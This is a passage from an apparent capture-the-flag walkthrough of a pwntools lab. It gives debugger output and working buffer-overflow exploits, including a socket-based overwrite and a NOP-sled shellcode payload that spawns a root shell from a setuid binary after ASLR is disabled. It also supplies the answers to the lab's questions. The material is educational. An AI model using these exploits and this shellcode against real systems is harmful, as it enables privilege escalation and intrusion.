──────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffb36b90 ◂— 'KKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
01:0004│     0xffb36b94 ◂— 'LLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
02:0008│     0xffb36b98 ◂— 'MMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
03:000c│     0xffb36b9c ◂— 'NNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
04:0010│     0xffb36ba0 ◂— 'OOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
05:0014│     0xffb36ba4 ◂— 'PPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
06:0018│     0xffb36ba8 ◂— 'QQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
07:001c│     0xffb36bac ◂— 'RRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ'
────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0 0x4a4a4a4a
   f 1 0x4b4b4b4b
   f 2 0x4c4c4c4c
   f 3 0x4d4d4d4d
   f 4 0x4e4e4e4e
   f 5 0x4f4f4f4f
   f 6 0x50505050
   f 7 0x51515151
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

Answer: `JJJJ`

#### What is the output of "cyclic 12"?

```bash
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/cyclic$ pwn cyclic 12
aaaabaaacaaa
```

Answer: `aaaabaaacaaa`

#### What pattern, in hex, was the eip overflowed with?

```bash
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/cyclic$ pwn cyclic 100 > pattern
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/cyclic$ gdb -q intro2pwn3
pwndbg: loaded 195 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from intro2pwn3...
(No debugging symbols found in intro2pwn3)
pwndbg> r < pattern
Starting program: /home/buzz/IntroToPwntools/IntroToPwntools/cyclic/intro2pwn3 < pattern
I run as dizmas.

Program received signal SIGSEGV, Segmentation fault.
0x6161616a in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────────────────────
 EAX  0xffb55e48 ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
 EBX  0x61616168 ('haaa')
 ECX  0xf7f72580 (_IO_2_1_stdin_) ◂— 0xfbad2098
 EDX  0xffb55eac ◂— 0x0
 EDI  0xf7f72000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 ESI  0xf7f72000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 EBP  0x61616169 ('iaaa')
 ESP  0xffb55e70 ◂— 'kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
 EIP  0x6161616a ('jaaa')
─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────────────────
Invalid address 0x6161616a










──────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffb55e70 ◂— 'kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
01:0004│     0xffb55e74 ◂— 'laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
02:0008│     0xffb55e78 ◂— 'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
03:000c│     0xffb55e7c ◂— 'naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
04:0010│     0xffb55e80 ◂— 'oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
05:0014│     0xffb55e84 ◂— 'paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
06:0018│     0xffb55e88 ◂— 'qaaaraaasaaataaauaaavaaawaaaxaaayaaa'
07:001c│     0xffb55e8c ◂— 'raaasaaataaauaaavaaawaaaxaaayaaa'
────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0 0x6161616a
   f 1 0x6161616b
   f 2 0x6161616c
   f 3 0x6161616d
   f 4 0x6161616e
   f 5 0x6161616f
   f 6 0x61616170
   f 7 0x61616171
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

Answer: `0x6161616a`

#### What is the flag?

```bash
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/cyclic$ cp pwn_cyclic.py pwn_cyclic2.py 
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/cyclic$ vi pwn_cyclic2.py 
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/cyclic$ cat pwn_cyclic2.py 
from pwn import *

padding = cyclic(cyclic_find('jaaa'))

eip = p32(0x8048536)

payload = padding + eip

sys.stdout.buffer.write(payload)

buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/cyclic$ python pwn_cyclic2.py > attack2
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/cyclic$ ./intro2pwn3 < attack2 
I run as dizmas.
Who are you?: Getting Flag:
flag{<REDACTED>}
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/cyclic$ 
```

Answer: `flag{<REDACTED>}`

### Task 4: Networking

When you are ready to move on, please enter the networking directory. Inside, you will find a note, an executable, and more c code. In the last challenge, we manually inputted our exploit, although pwntools give us the ability send and receive data automatically. This can work both locally and over a networking port. For this challenge, we will use the networking tools, and in the next challenge, we will use the local tools.

```bash
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/cyclic$ cd ..
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools$ cd networking/
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/networking$ ls -l
total 16
-rw-rw-r-- 1 dizmas dizmas  194 May 19  2021 note_to_buzz.txt
-rwxrwxr-x 1 buzz   buzz   7700 May 19  2021 serve_test
-rw-rw-r-- 1 buzz   buzz   2400 May 19  2021 test_networking.c
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/networking$ cat note_to_buzz.txt 
Dear buzz,

I'm running a service on port 1337, which has an overflow vulnerability.
I've left you a version that will run on port 1336 so that you can develop
your exploit. 

Sincerely,
dizmas
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/networking$ 
```

#### Unpacking the code

The note tells us what port is serving our flag. Please answer question 1.

If you netcat that port, it was say "Give me deadbeef: " and prompt until the connection is closed (please note, each time the connection is closed, the service will close until the cron restarts it each minute). To test out exploit, we can run our own version on port 1336. We can use tmux or use a second ssh session to have two interfaces, one to run the service, and one to develop out exploit.

```bash
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/networking$ cat test_networking.c 
//Networking C code from:
// https://www.geeksforgeeks.org/tcp-server-client-implementation-in-c/

#include <stdio.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#define MAX 32
#define PORT 1336
#define SA struct sockaddr
  
// function which handles input and output over the socket
void target_function(int sockfd)
{
    struct {
        char buff[MAX];
        volatile int printflag;
    } targets;


    for (;;) {
        bzero(targets.buff, MAX);
  
        write(sockfd, "Give me deadbeef: ", 18);

        targets.printflag = 0;
        read(sockfd, targets.buff, 100);
        
        printf("From client: %s\t ", targets.buff);
        bzero(targets.buff, MAX);
  
  
        if (targets.printflag == 0xdeadbeef) {
            write(sockfd, "Thank you!\nflag{*****************}", 34);
            break;
        }
        else if (targets.printflag != 0) {
            write(sockfd, "Buffer Overflow, but not with 0xdeadbeef", 40);
            break;
        }
    }
}
  

int main()
{
    int sockfd, connfd, len;
    struct sockaddr_in servaddr, cli;
  
    
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        printf("socket creation failed...\n");
        exit(0);
    }
    else
        printf("Socket successfully created..\n");
    bzero(&servaddr, sizeof(servaddr));
  
    // assign IP, PORT
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
    servaddr.sin_port = htons(PORT);
  
    // Binding newly created socket to given IP and verification
    if ((bind(sockfd, (SA*)&servaddr, sizeof(servaddr))) != 0) {
        printf("socket bind failed...\n");
        exit(0);
    }
    else
        printf("Socket successfully binded..\n");
  
    // Now server is ready to listen and verification
    if ((listen(sockfd, 5)) != 0) {
        printf("Listen failed...\n");
        exit(0);
    }
    else
        printf("Server listening..\n");
    len = sizeof(cli);
  
    // Accept the data packet from client and verification
    connfd = accept(sockfd, (SA*)&cli, &len);
    if (connfd < 0) {
        printf("server acccept failed...\n");
        exit(0);
    }
    else
        printf("server acccept the client...\n");
  
    // target function handles input and output
    target_function(connfd);
  
    // After chatting close the socket
    close(sockfd);
}
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/networking$ 
```

The code for this challenge is more involved that the previous challenges. I have used the following code, and edited it for my own purpose: [https://www.geeksforgeeks.org/tcp-server-client-implementation-in-c/](https://www.geeksforgeeks.org/tcp-server-client-implementation-in-c/).

For this challenge, we do not need to concern ourselves with `main()`, but only the `target_function()`. The struct at the beginning of the function, called `targets`, has two variables: `buff` and `printflag`. The buff is a char array of size MAX (MAX was defined to 32), and the `printflag` is a volatile int. These variables will be right next to each other in the stack, so if we manage to overflow the `buff` variable, then we can edit the `printflag`. If you see further down in the code, if the `printflag` variable is equal to `0xdeadbeef` (in hex) then it will send the flag. Please answer question 2.

```bash
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/networking$ vi deadbeef.py
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/networking$ cat deadbeef.py 
from pwn import *

padding = 32 * b'A'

eip = p32(0xdeadbeef)

payload = padding + eip

sys.stdout.buffer.write(payload)

buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/networking$ python deadbeef.py 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/networking$ 
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/networking$ python deadbeef.py | nc localhost 1337
Give me deadbeef: Thank you!
flag{<REDACTED>}buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/networking$ 
```

#### Networking to the flag

We will need to write a script to connect to the port, receive the data, and send our payload. To connect to a port in Pwntools, use the `remote()` function in the format of: `remote(IP, port)`.

```python
from pwn import *

connect = remote('127.0.0.1', 1336)
```

We can receive data with either the `recvn(bytes)` or `recvline()` functions. The `recvn()` receives as many bytes as specified, while the `recvline()` will receive data until there is a newline. Our code does not send a newline, so we will have to use `recvn()`. In our test_networking.c code, the "Give me deadbeef: " is 18 bytes, so we will receive **18 bytes**.

```python
print(connect.recvn(18))
```

We have to send enough data to overflow the `buff` variable, and write to the `printflag`. The `buff` is a **32** byte array, so we can write some character 32 times to overflow buff, and then write our `0xdeadbeef` to `printflag`.

```python
payload = "A"*32

payload += p32(0xdeadbeef)
```

We can send the payload with the `send()` function.

```python
connect.send(payload)
```

To receive our flag, We can just use `connect.recvn()` again. According to the c code, the flag will be **34** bytes long.

```python
print(connect.recvn(34))
```

Run this against your server at 1336 and make sure it works. Once you have, change the port to the answer to question 1 to receive the flag!

---------------------------------------------------------------------------------------

#### What port is serving our challenge?

```bash
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/networking$ cat note_to_buzz.txt 
Dear buzz,

I'm running a service on port 1337, which has an overflow vulnerability.
I've left you a version that will run on port 1336 so that you can develop
your exploit. 

Sincerely,
dizmas
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/networking$ 
```

Answer: `1337`

#### Please use checksec on serve_test. Is there a stack canary? (Y or N)

Hint: Even if there is a canary on the binary, both variables are within the stack, so the overflow will still work.

```bash
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/networking$ pwn checksec serve_test 
[*] '/home/buzz/IntroToPwntools/IntroToPwntools/networking/serve_test'
    Arch:       i386-32-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/networking$ 
```

Answer: `Y`

#### What is the flag?

```bash
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/networking$ vi pwn_networking.py
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/networking$ cat pwn_networking.py 
from pwn import *

io = remote('127.0.0.1', 1337)

print(io.recvn(18))

payload = 32 * b'A'
payload += p32(0xdeadbeef)

io.send(payload)
print(io.recvn(34))

buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/networking$ python pwn_networking.py 
[+] Opening connection to 127.0.0.1 on port 1337: Done
b'Give me deadbeef: '
b'Thank you!\nflag{<REDACTED>}'
[*] Closed connection to 127.0.0.1 port 1337
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/networking$ 
```

### Task 5: Shellcraft

It is time for our final challenge! Please navigate to the shellcraft directory. Inside, you will find four files: a note, a bash script, the executable, and the c code. If you read the note, you will see that you need to disable ASLR, which stands for address space layout randomization. This randomizes where in memory the executable is loaded each time it is run. Like PIE, it makes attacks that rely on memory layout more difficult. Please answer question 1.

```bash
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/networking$ cd ..
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools$ cd shellcraft/
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/shellcraft$ ls -l
total 20
-rwxrwxr-x 1 dizmas dizmas   49 May 19  2021 disable_aslr.sh
-rwsrwxr-x 1 root   root   7236 May 19  2021 intro2pwnFinal
-rw-rw-r-- 1 dizmas dizmas  233 May 19  2021 note_to_buzz_2.txt
-rw-rw-r-- 1 buzz   buzz    191 Jun  9  2021 test_shellcraft.c
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/shellcraft$ 
```

Please read the note and disable ASLR.

```bash
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/shellcraft$ cat note_to_buzz_2.txt 
Dear buzz,

For this last pwntools challenge, you will need to disable ASLR.
I have provided a script for you to do so, which you can run as 
sudo without a password. Just run:

sudo ./disable_aslr.sh


Good luck!

Sincerely,
dizmas
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/shellcraft$ cat disable_aslr.sh 
echo 0 | tee /proc/sys/kernel/randomize_va_space
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/shellcraft$ sudo ./disable_aslr.sh 
0
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/shellcraft$ 
```

#### Root of the Issue

Have you ever run an exploit on a machine to escalate privileges, and wondered how it works? Today, we are going to develop our own exploit to root this box! Some programs and services, such as sudo, need to run as root for the system to work properly, and when a vulnerability is discovered in one of these programs, an easy path to a root shell is opened. Please answer question 2.

You may have heard of the [heap buffer overflow vulnerability in sudo](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3156) which allowed for quick privilege escalation. The exploit, discovered in 2021, has its own [room on TryHackMe](https://tryhackme.com/room/sudovulnssamedit) if you are interested in learning more about it.

#### Shell in the Haystack

```bash
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/shellcraft$ cat test_shellcraft.c 
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>


void start(){
        char input[64];
        gets(input);
}


int main(){
        printf("Hello There. Do you have an input for me?\n");
        start();

}
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/shellcraft$ 
```

If we view the code for our executable, we see there is not much, just a call of `gets()`. If we remember from our cyclic task, `gets()` is vulnerable to buffer overflow, but this time, there is no `print_flag()` to jump to. When we control the eip, where should we jump to? Although there does not seem to be any useful instructions inside our code, what if we wrote our own instructions? Our variables are stored in memory, just like the program itself, so if we write instructions in our variable, and direct the eip to it, we can make the program follow our own instructions! This injected code is called **shellcode**, because it is traditionally (but not always) used to spawn a shell. If you recall, our variables are stored in the stack, so if we direct the eip to the stack, we will direct it to our shellcode. Please answer question 3.

Let's get control of that eip! Please find the location of the eip, like we did in the cyclic task. Please answer question 4.

I would recommend filling the eip with 0xdeadbeef like we did before.

Once we control the eip, we need to direct it to the stack where we can place our own code. The top of the stack is pointed to by the SP (or stack pointer) which is called esp in 32-bit machines. For me, the esp is located at `0xffffd510`, and you can check the location of yours in gdb. If we want to jump to our shellcode, we want to jump to the middle of the stack (rather than the top where the SP points), so we usually add an offset to the esp location in your exploit. I use an offset of `200`, because that's what ended up working for me. In other challenges, you may only need an offset of 8 or 16. I have found that choosing the right offset is a matter of trial and error.

```python
from pwn import *

padding = cyclic(cyclic_find('answer_to_question_4'))

eip = p32(0xffffd510+200)
```

You may be wondering how we are going to point the eip to our shellcode (rather than other data in the stack), and the answer is to make our variable into a big landing spot. There is an instruction in assembly called no-operation (or **NOP**), which is `0x90` in hex, and the NOP is a space holder that passes the eip to the next space in memory. If we make a giant "landing pad" of NOPs, and direct the eip towards the middle of the stack, odds are that the eip will land on our NOP pad, and the NOPs will pass the eip down to eventually hit our shellcode. This is often called a NOP slide (or sled), because the eip will land in the NOPs and slide down to the shellcode. In my case, a NOP sled of `1000` worked, but other challenges may require different sizes. When writing a raw hex byte in python, we use the format `"\x00"`, so we can write `"\x90"` for a NOP.

`nop_slide = "\x90" * 1000`

Before we write our shellcode, we can inject a breakpoint at the end of our NOP slide to make sure the slide works. The **breakpoint** instruction in hex is `"0xcc"`, and so we can add the following to our code:

`shellcode = "\xcc"`

Our payload should be as follows:

`payload = padding + eip + nop_slide + shellcode`

Please direct the output of this file to a text file.

if we input the text file to intro2pwnFinal, we should hit a breakpoint. Please answer question 5.

Great, we can inject our own code into the program! Of course, we want to do more than hit a breakpoint, we want to spawn a root shell. That means we need to write some shellcode. While some crazy people like to write shellcode from scratch, pwntools gives us a great utility to cook up shellcode: `shellcraft`. If you have ever used `msfvenom`, shellcraft is a similar tool. Like `cyclic`, `shellcraft` can be used in the command line and inside python code. I like to use the command line, and copy and paste the shellcode over to my exploit script. The command line command for shellcraft is: `shellcraft arch.OS.command`, such as:

`shellcraft i386.linux.sh`

This is for a basic bash shell for Linux executables with i386 architecture. A neat feature of shellcraft is that we can print out the shellcode in different formats with the -f flag. The possible formats are listed if you enter the shellcraft -h command. Please answer question 6.

There is a bit of a snag in the above shellcode. In order to get a root shell, we need to keep the privileges of intro2pwnFinal, although bash will drop the privileges unless we add the -p flag. If we observe the assembly code for this shell, we see that it uses execve and passes /bin///sh as the first parameter and ['sh'] as the second. The first parameter is the path to what we want to execute, and the second parameter is the argv array, which contains the command line arguments (If you are confused about execve, you can refer to this man page [here](https://man7.org/linux/man-pages/man2/execve.2.html)).  In this case, we want to execute /bin///sh, but we want to pass 'sh' and '-p' into the argv array. We can use shellcraft to create execve shellcode with"/bin///sh" and "['sh', '-p']" as parameters. We can do this with the following command:

`shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f a`

```bash
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/shellcraft$ pwn shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f a
    /* execve(path='/bin///sh', argv=['sh', '-p'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp
    /* push argument array ['sh\x00', '-p\x00'] */
    /* push 'sh\x00-p\x00\x00' */
    push 0x70
    push 0x1010101
    xor dword ptr [esp], 0x2c016972
    xor ecx, ecx
    push ecx /* null terminate */
    push 7
    pop ecx
    add ecx, esp
    push ecx /* '-p\x00' */
    push 8
    pop ecx
    add ecx, esp
    push ecx /* 'sh\x00' */
    mov ecx, esp
    xor edx, edx
    /* call execve() */
    push SYS_execve /* 0xb */
    pop eax
    int 0x80

buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/shellcraft$ 
```

When we run this command, we see it is the same as the linux.sh shellcode, except the added '-p' to the argv array. To write shellcode that is easier to use in our python exploit script, we can replace the "-f a" with "-f s", which will print our shellcode in **string** format. We can copy that and paste it into our exploit code (replacing the breakpoint instruction):

`shellcode = "jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"`

```bash
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/shellcraft$ pwn shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f s
"jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/shellcraft$ 
```

Our code is almost done! Until this point, we have been printing our payload and manually inputting it into the executable. Like in the networking task, Pwntools allows us to interact with the program automatically. For a local process, we use the `process()` function.

`proc = process('./intro2pwnFinal')`

We can receive data from the process, and since the process sends data with a new line, we can use `recvline()`, rather than `recvn()`.

`proc.recvline()`

After we have crafted our payload, we can send it with:

`proc.send(payload)`

Finally, after we have sent the payload, we need a way to communicate with the shell we have just spawned. We can do with with

`proc.interactive()`

So, to recap, our whole python script is:

```python
from pwn import *

proc = process('./intro2pwnFinal')

proc.recvline()

padding = cyclic(cyclic_find('taaa'))

eip = p32(0xffffd510+200)

nop_slide = "\x90"*1000

shellcode = "jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"

payload = padding + eip + nop_slide + shellcode

proc.send(payload)

proc.interactive()
```

Alright, that was a lot! Take a deep breath and run our python code. If we did this right, we should get an interactive shell. The first command may not register, but the second one should work. If you received an "Got EOF while reading in interactive", then you have an error, and will need to troubleshoot. The people at the THM discord are helpful, and I hang out there frequently myself. Please answer question 7.

Congratulations, you have a root shell! You will find the flag in the `/root` directory.

---------------------------------------------------------------------------------------

#### What does ASLR stand for?

Answer: `address space layout randomization`

#### What is the number of displayed packets?

```bash
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/shellcraft$ ls -l
total 20
-rwxrwxr-x 1 dizmas dizmas   49 May 19  2021 disable_aslr.sh
-rwsrwxr-x 1 root   root   7236 May 19  2021 intro2pwnFinal
-rw-rw-r-- 1 dizmas dizmas  233 May 19  2021 note_to_buzz_2.txt
-rw-rw-r-- 1 buzz   buzz    191 Jun  9  2021 test_shellcraft.c
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/shellcraft$ 
```

Answer: `root`

#### Use checksec on intro2pwn final. Is NX enabled? (Y or N)

Hint: If NX in enabled, then writable areas of memory (like the stack) are not executable. This means our shellcode would not execute.

```bash
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/shellcraft$ pwn checksec intro2pwnFinal 
[*] '/home/buzz/IntroToPwntools/IntroToPwntools/shellcraft/intro2pwnFinal'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/shellcraft$ 
```

Answer: `N`

#### Please use the cyclic tool and gdb to find the eip. What letter sequence fills the eip?

Hint: What is 0x61616174 is ascii?

```bash
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/shellcraft$ pwn cyclic 100 > pattern
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/shellcraft$ gdb -q intro2pwnFinal
pwndbg: loaded 195 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from intro2pwnFinal...
(No debugging symbols found in intro2pwnFinal)
pwndbg> r < pattern
Starting program: /home/buzz/IntroToPwntools/IntroToPwntools/shellcraft/intro2pwnFinal < pattern
Hello There. Do you have an input for me?

Program received signal SIGSEGV, Segmentation fault.
0x61616174 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────────────────────
 EAX  0xffffd410 ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
 EBX  0x61616172 ('raaa')
 ECX  0xf7fba580 (_IO_2_1_stdin_) ◂— 0xfbad2098
 EDX  0xffffd474 —▸ 0xf7fba000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 EDI  0xf7fba000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 ESI  0xf7fba000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
 EBP  0x61616173 ('saaa')
 ESP  0xffffd460 ◂— 'uaaavaaawaaaxaaayaaa'
 EIP  0x61616174 ('taaa')
─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────────────────
Invalid address 0x61616174










──────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffffd460 ◂— 'uaaavaaawaaaxaaayaaa'
01:0004│     0xffffd464 ◂— 'vaaawaaaxaaayaaa'
02:0008│     0xffffd468 ◂— 'waaaxaaayaaa'
03:000c│     0xffffd46c ◂— 'xaaayaaa'
04:0010│     0xffffd470 ◂— 'yaaa'
05:0014│ edx 0xffffd474 —▸ 0xf7fba000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
06:0018│     0xffffd478 ◂— 0x0
07:001c│     0xffffd47c —▸ 0xf7de9ed5 (__libc_start_main+245) ◂— add    esp, 0x10
────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0 0x61616174
   f 1 0x61616175
   f 2 0x61616176
   f 3 0x61616177
   f 4 0x61616178
   f 5 0x61616179
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

Answer: `taaa`

#### Run your exploit with the breakpoint outside of gdb (./intro2pwnFinal < output_file). What does it say when you hit the breakpoint?

Hint: In gdb, it will say "Program received signal SIGTRAP, Trace/breakpoint trap."

```bash
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/shellcraft$ vi shellcode.py 
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/shellcraft$ cat shellcode.py 
from pwn import *

padding = cyclic(cyclic_find('taaa'))

eip = p32(0xffffd510+200)

nop_slide = b"\x90" * 1000

shellcode = b"\xcc"

payload = padding + eip + nop_slide + shellcode

sys.stdout.buffer.write(payload)

buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/shellcraft$ python shellcode.py > attack1
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/shellcraft$ ./intro2pwnFinal < attack1 
Hello There. Do you have an input for me?
Trace/breakpoint trap (core dumped)
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/shellcraft$ 
```

Answer: `Trace/breakpoint trap`

#### Run the command "shellcraft i386.linux.sh -f a", which will print our shellcode in assembly format. What function is it using?

Hint: It is in the exec() family of functions.

```bash
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/shellcraft$ pwn shellcraft i386.linux.sh -f a
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016972
    xor ecx, ecx
    push ecx /* null terminate */
    push 4
    pop ecx
    add ecx, esp
    push ecx /* 'sh\x00' */
    mov ecx, esp
    xor edx, edx
    /* call execve() */
    push SYS_execve /* 0xb */
    pop eax
    int 0x80

buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/shellcraft$ 
```

Answer: `execve`

#### Run whoami once you have the shell. Who are you?

```bash
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/shellcraft$ vi exploit.py
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/shellcraft$ cat exploit.py 
from pwn import *

proc = process('./intro2pwnFinal')

proc.recvline()

padding = cyclic(cyclic_find('taaa'))

